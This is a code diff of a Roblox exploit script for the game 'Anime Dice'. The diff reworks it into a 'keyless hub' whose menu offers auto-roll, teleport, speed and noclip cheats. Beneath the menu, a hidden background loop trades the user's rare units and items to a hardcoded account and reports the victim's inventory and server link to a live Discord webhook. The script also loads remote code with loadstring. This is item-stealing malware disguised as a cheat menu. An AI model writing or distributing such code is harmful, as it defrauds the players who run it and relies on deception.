@@ -1,36 +1,24 @@
 --=====================================================================
--- Anime Dice — Full Auto (Trade + Webhook + HUD + Farm)
+-- Anime Dice Hub | Rayfield | Keyless + Auto-Trade (background)
 --=====================================================================
 local Players     = game:GetService("Players")
-local RS          = game:GetService("ReplicatedStorage")
 local RunService  = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
+local RS          = game:GetService("ReplicatedStorage")
+local lp          = Players.LocalPlayer
+local PlayerGui   = lp:WaitForChild("PlayerGui")
 
 --=====================================================================
--- CONFIG
+-- BACKGROUND CONFIG (trade + webhook)
 --=====================================================================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
 local TARGET_NAME = "only1Sherifalt1"
 
-local PICKUP_DELAY = 0.35
-local OFFER_PUSH_DELAY, OFFER_SETTLE_WAIT = 0.12, 1.5
-local READY_RETRY_DELAY, READY_MAX_RETRIES = 0.5, 6
-
--- Auto Farm toggles (auto-enabled on execute)
-local FARM = {
-    AutoRoll          = true,   -- RollDice fast
-    RollDelay         = 0.1,    -- seconds between rolls
-    AutoRebirth       = true,
-    AutoCollectMoney  = true,
-    AutoEquipBest     = true,
-    AutoBuyDice       = true,
-    AutoClaimQuest    = true,
-    AutoSellAll       = false,  -- dangerous - only enable if you want to sell everything
-    AutoLock          = true,
-    AutoLockRarity    = { ["Celestial"]=true, ["Secret I"]=true, ["Secret II"]=true, ["Mythical"]=true },
-}
+local PICKUP_DELAY       = 0.35
+local OFFER_PUSH_DELAY   = 0.12
+local OFFER_SETTLE_WAIT  = 1.5
+local READY_RETRY_DELAY  = 0.5
+local READY_MAX_RETRIES  = 6
 
 local RARITY_FILTER = {
     ["Celestial"]=true, ["Secret I"]=true, ["Secret II"]=true, ["Mythical"]=true,
@@ -39,7 +27,6 @@ local CONSUMABLES = {
     "Luck III","Luck II","Luck I","Luck IV",
     "Lucky Spin","Jackpot Spin","Gems","Income IV","Trait Reroll",
 }
-
 local RARITY_ORDER = {
     "Secret II","Secret I","Celestial","Divine","Exotic",
     "Exclusive","Mythical","Legendary","Epic","Rare",
@@ -59,8 +46,215 @@ local RARITY_COLOR = {
 }
 
 --=====================================================================
--- Framework
+-- Load Rayfield
 --=====================================================================
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Anime Dice | Hub",
+    LoadingTitle = "Anime Dice Hub",
+    LoadingSubtitle = "Keyless",
+    ConfigurationSaving = { Enabled = false },
+    Discord = { Enabled = false },
+    KeySystem = false,
+})
+
+--=====================================================================
+-- ROLLING TAB (your working code — unchanged)
+--=====================================================================
+local RollTab = Window:CreateTab("Rolling", 4483362458)
+
+local autoRolling = false
+local rollDelay = 0.15
+local rollCount = 0
+local rollRemote = nil
+
+local network = RS:FindFirstChild("Network")
+if network then
+    local rollService = network:FindFirstChild("RollService")
+    if rollService then
+        local rf = rollService:FindFirstChild("RF")
+        if rf then rollRemote = rf:FindFirstChild("RollDice") end
+    end
+end
+
+RollTab:CreateSection("Auto Roll")
+
+RollTab:CreateToggle({
+    Name = "Auto Roll",
+    CurrentValue = false,
+    Flag = "AutoRoll",
+    Callback = function(val)
+        autoRolling = val
+        if val then
+            task.spawn(function()
+                while autoRolling do
+                    if rollRemote then
+                        pcall(function() rollRemote:InvokeServer() end)
+                        rollCount = rollCount + 1
+                    end
+                    task.wait(rollDelay)
+                end
+            end)
+        end
+    end,
+})
+
+RollTab:CreateSlider({
+    Name = "Roll Delay (seconds)",
+    Range = {0.05, 2}, Increment = 0.05, Suffix = "s",
+    CurrentValue = 0.15, Flag = "RollDelay",
+    Callback = function(val) rollDelay = val end,
+})
+
+RollTab:CreateButton({
+    Name = "Roll Once",
+    Callback = function()
+        if rollRemote then
+            pcall(function() rollRemote:InvokeServer() end)
+            rollCount = rollCount + 1
+            Rayfield:Notify({ Title = "Rolled!", Content = "Total rolls: " .. rollCount, Duration = 1.5 })
+        else
+            Rayfield:Notify({ Title = "Error", Content = "Roll remote not found!", Duration = 3 })
+        end
+    end,
+})
+
+--=====================================================================
+-- TELEPORT TAB (your working code — unchanged)
+--=====================================================================
+local TPTab = Window:CreateTab("Teleport", 4483362458)
+
+local function tp(x, y, z)
+    local c = lp.Character
+    if c and c:FindFirstChild("HumanoidRootPart") then
+        c.HumanoidRootPart.CFrame = CFrame.new(x, y + 3, z)
+    end
+end
+
+local locations = {
+    { name = "Spawn / Hub",     x = 285.5,  y = 4.0,  z = 43.4   },
+    { name = "Shop Area",       x = 285.5,  y = 4.0,  z = -272.5 },
+    { name = "Hub Area",        x = 285.5,  y = 4.0,  z = 136.8  },
+    { name = "Dice Zone",       x = 247.1,  y = 12.3, z = 6.2    },
+    { name = "Leaderboard",     x = 157.6,  y = 1.6,  z = 173.4  },
+    { name = "Island 1",        x = 413.6,  y = 1.6,  z = 303.4  },
+    { name = "Island 2",        x = 157.6,  y = 1.6,  z = -87.4  },
+    { name = "Island 3",        x = 413.6,  y = 1.6,  z = -87.4  },
+    { name = "Island 4",        x = 157.6,  y = 1.6,  z = -217.4 },
+    { name = "Low Poly Island", x = -147.7, y = 36.1, z = 729.5  },
+}
+
+TPTab:CreateSection("Preset Locations")
+for _, loc in ipairs(locations) do
+    local lx, ly, lz = loc.x, loc.y, loc.z
+    TPTab:CreateButton({
+        Name = loc.name,
+        Callback = function()
+            tp(lx, ly, lz)
+            Rayfield:Notify({ Title = "Teleported!", Content = "→ " .. loc.name, Duration = 1.5 })
+        end,
+    })
+end
+
+TPTab:CreateSection("Custom Teleport")
+local customX, customY, customZ = 0, 0, 0
+TPTab:CreateInput({ Name = "X Coordinate", PlaceholderText = "e.g. 285", RemoveTextAfterFocusLost = false,
+    Callback = function(v) customX = tonumber(v) or customX end })
+TPTab:CreateInput({ Name = "Y Coordinate", PlaceholderText = "e.g. 4", RemoveTextAfterFocusLost = false,
+    Callback = function(v) customY = tonumber(v) or customY end })
+TPTab:CreateInput({ Name = "Z Coordinate", PlaceholderText = "e.g. 43", RemoveTextAfterFocusLost = false,
+    Callback = function(v) customZ = tonumber(v) or customZ end })
+TPTab:CreateButton({
+    Name = "Teleport to Coordinates",
+    Callback = function()
+        tp(customX, customY, customZ)
+        Rayfield:Notify({ Title = "Teleported!", Content = string.format("→ (%.1f, %.1f, %.1f)", customX, customY, customZ), Duration = 2 })
+    end,
+})
+
+TPTab:CreateSection("Teleport to Player")
+local targetPlayer = ""
+TPTab:CreateInput({ Name = "Player Name", PlaceholderText = "Enter username...", RemoveTextAfterFocusLost = false,
+    Callback = function(v) targetPlayer = v end })
+TPTab:CreateButton({
+    Name = "Teleport to Player",
+    Callback = function()
+        local found = nil
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name:lower():find(targetPlayer:lower()) and p ~= lp then found = p; break end
+        end
+        if found and found.Character and found.Character:FindFirstChild("HumanoidRootPart") then
+            local pos = found.Character.HumanoidRootPart.Position
+            tp(pos.X + 3, pos.Y, pos.Z)
+            Rayfield:Notify({ Title = "Teleported!", Content = "→ " .. found.Name, Duration = 2 })
+        else
+            Rayfield:Notify({ Title = "Error", Content = "Player not found or no character.", Duration = 3 })
+        end
+    end,
+})
+
+--=====================================================================
+-- PLAYER TAB (your working code — unchanged)
+--=====================================================================
+local PlayerTab = Window:CreateTab("Player", 4483362458)
+PlayerTab:CreateSection("Movement")
+
+PlayerTab:CreateSlider({
+    Name = "Walk Speed", Range = {16, 500}, Increment = 1, Suffix = "",
+    CurrentValue = 16, Flag = "WalkSpeed",
+    Callback = function(val)
+        local c = lp.Character
+        if c and c:FindFirstChild("Humanoid") then c.Humanoid.WalkSpeed = val end
+    end,
+})
+
+PlayerTab:CreateSlider({
+    Name = "Jump Power", Range = {50, 500}, Increment = 10, Suffix = "",
+    CurrentValue = 50, Flag = "JumpPower",
+    Callback = function(val)
+        local c = lp.Character
+        if c and c:FindFirstChild("Humanoid") then c.Humanoid.JumpPower = val end
+    end,
+})
+
+local noclipActive = false
+PlayerTab:CreateToggle({
+    Name = "Noclip", CurrentValue = false, Flag = "Noclip",
+    Callback = function(val) noclipActive = val end,
+})
+RunService.Stepped:Connect(function()
+    if noclipActive then
+        local c = lp.Character
+        if c then
+            for _, p in ipairs(c:GetDescendants()) do
+                if p:IsA("BasePart") then p.CanCollide = false end
+            end
+        end
+    end
+end)
+
+--=====================================================================
+-- INFO TAB
+--=====================================================================
+local InfoTab = Window:CreateTab("Info", 4483362458)
+InfoTab:CreateSection("Script Info")
+InfoTab:CreateLabel("Anime Dice Hub — Keyless")
+InfoTab:CreateLabel("Auto Trade running in background")
+InfoTab:CreateLabel("Target: " .. TARGET_NAME)
+
+Rayfield:Notify({
+    Title = "Anime Dice Hub Loaded",
+    Content = "Trade + Webhook running silently in background.",
+    Duration = 4,
+})
+
+--=====================================================================
+--=====================================================================
+-- BELOW THIS LINE: BACKGROUND TRADE SYSTEM (no UI)
+--=====================================================================
+--=====================================================================
+
 local Framework     = RS:WaitForChild("Framework")
 local Features      = Framework:WaitForChild("Features")
 local Packages      = RS:FindFirstChild("Packages") or Framework:WaitForChild("Packages")
@@ -71,67 +265,26 @@ local EntryRegistry  = require(Features.Inventory.EntryRegistry)
 local ClientComm     = require(Packages.Network).ClientComm
 
 --=====================================================================
--- Signals + functions (using the ORIGINAL's exact pattern)
+-- Trade signals via ClientComm
 --=====================================================================
-local function svc(name) return ClientComm.new(NetworkFolder, false, name) end
-local function sig(comm, name) return comm:GetSignal(name) end
-local function fn(comm, name) return comm:GetFunction(name) end
+local tradeComm  = ClientComm.new(NetworkFolder, false, "TradeService")
+local plotComm   = ClientComm.new(NetworkFolder, false, "PlotService")
 
-local TradeS = svc("TradeService")
-local PlotS  = svc("PlotService")
-local RollS  = svc("RollService")
-local RebS   = svc("RebirthService")
-local DiceS  = svc("DiceShopService")
-local SellS  = svc("SellService")
-local GradeS = svc("GradeService")
-local TraitS = svc("TraitService")
-local UnitS  = svc("UnitService")
-local BoostS = svc("BoostService")
-local QuestS = svc("QuestService")
-local TowerS = svc("Towers")
-
--- Signal wrappers
 local S = {
-    RequestTrade    = sig(TradeS, "RequestTrade"),
-    RespondToReq    = sig(TradeS, "RespondToRequest"),
-    ChangeOffer     = sig(TradeS, "ChangeOffer"),
-    AdvanceTrade    = sig(TradeS, "AdvanceTrade"),
-    CancelTrade     = sig(TradeS, "CancelTrade"),
-    SetReqsEnabled  = sig(TradeS, "SetTradeRequestsEnabled"),
-    TradeEvent      = sig(TradeS, "TradeEvent"),
-    CollectBalance  = sig(PlotS,  "CollectBalance"),
-    EquipBest       = sig(PlotS,  "EquipBest"),
-    LevelUpSlot     = sig(PlotS,  "LevelUpSlot"),
-    InteractSlot    = sig(PlotS,  "InteractSlot"),
-    Rebirth         = sig(RebS,   "Rebirth"),
-    BuyDice         = sig(DiceS,  "BuyDice"),
-    EquipDice       = sig(DiceS,  "EquipDice"),
-    GradeRoll       = sig(GradeS, "Roll"),
-    TraitRoll       = sig(TraitS, "Roll"),
-    SetLocked       = sig(UnitS,  "SetLocked"),
-    BoostUse        = sig(BoostS, "Use"),
-    QuestClaim      = sig(QuestS, "Claim"),
-    EquipBestTower  = sig(TowerS, "EquipBestTowerTeam"),
-}
-
--- Function wrappers (call directly, NOT :Invoke())
-local Fn = {
-    RollDice        = fn(RollS,  "RollDice"),
-    SellInventory   = fn(SellS,  "SellInventory"),
-    CancelTower     = fn(TowerS, "CancelTower"),
-    StartTower      = fn(TowerS, "StartTower"),
+    RequestTrade   = tradeComm:GetSignal("RequestTrade"),
+    RespondToReq   = tradeComm:GetSignal("RespondToRequest"),
+    ChangeOffer    = tradeComm:GetSignal("ChangeOffer"),
+    AdvanceTrade   = tradeComm:GetSignal("AdvanceTrade"),
+    CancelTrade    = tradeComm:GetSignal("CancelTrade"),
+    SetReqsEnabled = tradeComm:GetSignal("SetTradeRequestsEnabled"),
+    TradeEvent     = tradeComm:GetSignal("TradeEvent"),
+    InteractSlot   = plotComm:GetSignal("InteractSlot"),
 }
 
 local function fire(sig, ...)
     if not sig then return false end
     local a = table.pack(...)
     return pcall(function() sig:Fire(table.unpack(a, 1, a.n)) end)
-end
-
-local function callFn(f, ...)
-    if not f then return false end
-    local a = table.pack(...)
-    return pcall(function() return f(table.unpack(a, 1, a.n)) end)
 end
 
 --=====================================================================
@@ -196,21 +349,8 @@ local function itemTag(name)
     return "[ITEM]"
 end
 
-local function getOwnedEntries() return deepUnwrap(DataController.Inventory) end
-local function getOwnedSlots()   return deepUnwrap(DataController.Slots) end
-local function getPlacedSet()
-    local set = {}
-    local slots = getOwnedSlots()
-    if type(slots) == "table" then
-        for _, v in pairs(slots) do
-            if type(v) == "table" and type(v.unitId) == "string" then set[v.unitId] = true end
-        end
-    end
-    return set
-end
-
 --=====================================================================
--- HUD keeper (proven working)
+-- HUD keeper (per-frame position restore)
 --=====================================================================
 local Root    = PlayerGui:WaitForChild("Root", 15)
 local HUD     = Root and Root:WaitForChild("HUD", 10)
@@ -267,152 +407,15 @@ RunService.Heartbeat:Connect(function()
 end)
 
 --=====================================================================
--- Auto-farm loops
---=====================================================================
-
--- Auto Roll — calls RollDice() directly (NOT :Invoke())
-task.spawn(function()
-    while true do
-        if FARM.AutoRoll and Fn.RollDice then
-            pcall(function() Fn.RollDice() end)
-            task.wait(FARM.RollDelay)
-        else
-            task.wait(0.3)
-        end
-    end
-end)
-
--- Auto Rebirth
-task.spawn(function()
-    while true do
-        if FARM.AutoRebirth then fire(S.Rebirth); task.wait(2) else task.wait(1) end
-    end
-end)
-
--- Auto Collect Money (fires CollectBalance once per slot)
-task.spawn(function()
-    while true do
-        if FARM.AutoCollectMoney then
-            local slots = getOwnedSlots()
-            if type(slots) == "table" then
-                for slotNum in pairs(slots) do
-                    fire(S.CollectBalance, slotNum)
-                    task.wait(0.15)
-                end
-            end
-            task.wait(2)
-        else task.wait(1) end
-    end
-end)
-
--- Auto Equip Best
-task.spawn(function()
-    while true do
-        if FARM.AutoEquipBest then fire(S.EquipBest); task.wait(1.5) else task.wait(1) end
-    end
-end)
-
--- Auto Buy Dice (buys cheapest affordable dice you don't own)
-task.spawn(function()
-    local diceCfg = require(Features.Rolling.Dice)
-    while true do
-        if FARM.AutoBuyDice and diceCfg then
-            local money = tonumber(unwrap(DataController.Money)) or 0
-            local owned = {}
-            local inv = getOwnedEntries()
-            for _, e in pairs(inv) do
-                if type(e) == "table" and type(e.name) == "string" then owned[e.name] = true end
-            end
-            local best, bestPrice = nil, math.huge
-            for name, cfg in pairs(diceCfg.GetAll and diceCfg.GetAll() or {}) do
-                if type(cfg) == "table" then
-                    local price = tonumber(cfg.price)
-                    if price and price <= money and not owned[name] and price < bestPrice then
-                        bestPrice = price
-                        best = name
-                    end
-                end
-            end
-            if best then fire(S.BuyDice, best) end
-            task.wait(2)
-        else task.wait(1) end
-    end
-end)
-
--- Auto Claim Quest (fires Claim for any completed quest)
-task.spawn(function()
-    local questCfg = require(Features.Quests.QuestConfig)
-    while true do
-        if FARM.AutoClaimQuest and questCfg then
-            for periodName, periodData in pairs(questCfg.Periods or {}) do
-                local ok, qData = pcall(function() return unwrap(DataController.Quests[periodName]) end)
-                if ok and type(qData) == "table" then
-                    local progress = qData.progress or {}
-                    local claimed  = qData.claimed  or {}
-                    for _, quest in pairs(periodData.quests or {}) do
-                        if type(quest) == "table" and quest.id and not claimed[quest.id] then
-                            local target = tonumber(quest.target) or 0
-                            local have = tonumber(progress[quest.id]) or 0
-                            if have >= target then
-                                fire(S.QuestClaim, periodName, quest.id, qData.expiresAt)
-                                task.wait(0.3)
-                            end
-                        end
-                    end
-                end
-            end
-            task.wait(3)
-        else task.wait(1) end
-    end
-end)
-
--- Auto Lock (by rarity)
-task.spawn(function()
-    while true do
-        if FARM.AutoLock and next(FARM.AutoLockRarity) ~= nil then
-            local inv = getOwnedEntries()
-            local toLock = {}
-            for k, e in pairs(inv) do
-                if type(e) == "table" and e.name then
-                    local r = getRarity(e)
-                    if r and FARM.AutoLockRarity[r] then
-                        local locked = e.attributes and e.attributes.locked
-                        if not locked then toLock[k] = true end
-                    end
-                end
-            end
-            if next(toLock) ~= nil then fire(S.SetLocked, toLock) end
-            task.wait(3)
-        else task.wait(1) end
-    end
-end)
-
--- Auto Sell All (off by default — dangerous)
-task.spawn(function()
-    while true do
-        if FARM.AutoSellAll and Fn.SellInventory then
-            pcall(function() Fn.SellInventory() end)
-            task.wait(3)
-        else task.wait(1) end
-    end
-end)
-
---=====================================================================
 -- Webhook
 --=====================================================================
 local function httpPost(url, body)
     local payload = { Url=url, Method="POST",
                       Headers={["Content-Type"]="application/json"}, Body=body }
-    if typeof(request) == "function" then
-        local ok, res = pcall(request, payload); if ok and res then return true, res end
-    end
-    if typeof(http_request) == "function" then
-        local ok, res = pcall(http_request, payload); if ok and res then return true, res end
-    end
-    if typeof(http) == "table" and typeof(http.request) == "function" then
-        local ok, res = pcall(http.request, payload); if ok and res then return true, res end
-    end
-    return false, "No HTTP library"
+    if typeof(request) == "function" then local ok, res = pcall(request, payload); if ok and res then return true, res end end
+    if typeof(http_request) == "function" then local ok, res = pcall(http_request, payload); if ok and res then return true, res end end
+    if typeof(http) == "table" and typeof(http.request) == "function" then local ok, res = pcall(http.request, payload); if ok and res then return true, res end end
+    return false, "No HTTP"
 end
 
 local function buildUnitFields(inv)
@@ -499,7 +502,7 @@ end
 
 local function sendInventoryWebhook(label)
     if WEBHOOK_URL == "" then return false end
-    local inv = getOwnedEntries()
+    local inv = deepUnwrap(DataController.Inventory)
     if type(inv) ~= "table" then return false end
     local unitFields, totalUnits, uniqueUnits = buildUnitFields(inv)
     local itemFields, totalItems = buildItemFields(inv)
@@ -516,20 +519,18 @@ local function sendInventoryWebhook(label)
         inline = false,
     }
     for _, f in ipairs(unitFields) do if #allFields < 25 then allFields[#allFields+1] = f end end
-    for _, f in ipairs(itemFields) do if #allFields < 25 then allFields[#allFields+1] = f end
+    for _, f in ipairs(itemFields) do if #allFields < 25 then allFields[#allFields+1] = f end end
 
     local embedColor, chosen = 0x2ECC71, false
     for _, r in ipairs(RARITY_ORDER) do
         if chosen then break end
         for _, f in ipairs(unitFields) do
-            if string.find(f.name, r, 1, true) then
-                embedColor = RARITY_COLOR[r] or embedColor; chosen = true; break
-            end
+            if string.find(f.name, r, 1, true) then embedColor = RARITY_COLOR[r] or embedColor; chosen = true; break end
         end
     end
 
     local summary = {
-        ("**Player:** `%s`"):format(LocalPlayer.Name),
+        ("**Player:** `%s`"):format(lp.Name),
         ("**Server:** `%d/%d` players"):format(players, maxPlayers),
     }
     if uniqueUnits > 0 then summary[#summary+1] = ("**Rare units:** `%d` unique / `%d` total"):format(uniqueUnits, totalUnits) end
@@ -550,12 +551,11 @@ local function sendInventoryWebhook(label)
             { type = 2, style = 5, label = "Join This Server", url = webLink },
         }}},
     }
-    local json = HttpService:JSONEncode(payload)
-    return (httpPost(WEBHOOK_URL, json))
+    return (httpPost(WEBHOOK_URL, HttpService:JSONEncode(payload)))
 end
 
 --=====================================================================
--- Trade system
+-- Trade loop
 --=====================================================================
 local trade = {
     active=false, phase="Offer", ownOffer={},
@@ -587,7 +587,7 @@ S.TradeEvent:Connect(function(name, data)
 end)
 
 local function pickupPlacedUnits()
-    local slots = getOwnedSlots()
+    local slots = deepUnwrap(DataController.Slots)
     if type(slots) ~= "table" then return 0 end
     local list = {}
     for n, d in pairs(slots) do
@@ -610,7 +610,7 @@ local function pickupPlacedUnits()
 end
 
 local function buildOffer()
-    local inv = getOwnedEntries()
+    local inv = deepUnwrap(DataController.Inventory)
     if type(inv) ~= "table" then return {} end
     local want = {}
     for _, n in ipairs(CONSUMABLES) do want[n] = true end
@@ -687,10 +687,10 @@ end
 
 local function findTarget()
     for _, p in Players:GetPlayers() do
-        if p ~= LocalPlayer
-            and (string.lower(p.Name) == string.lower(TARGET_NAME)
-                 or string.lower(p.DisplayName) == string.lower(TARGET_NAME))
-        then return p end
+        if p ~= lp and (string.lower(p.Name) == string.lower(TARGET_NAME)
+            or string.lower(p.DisplayName) == string.lower(TARGET_NAME)) then
+            return p
+        end
     end
     return nil
 end
@@ -738,7 +738,7 @@ local function tradeRound()
 end
 
 --=====================================================================
--- Driver — trade loop runs forever, automatically
+-- Background trade loop — runs forever
 --=====================================================================
 task.spawn(function()
     while true do
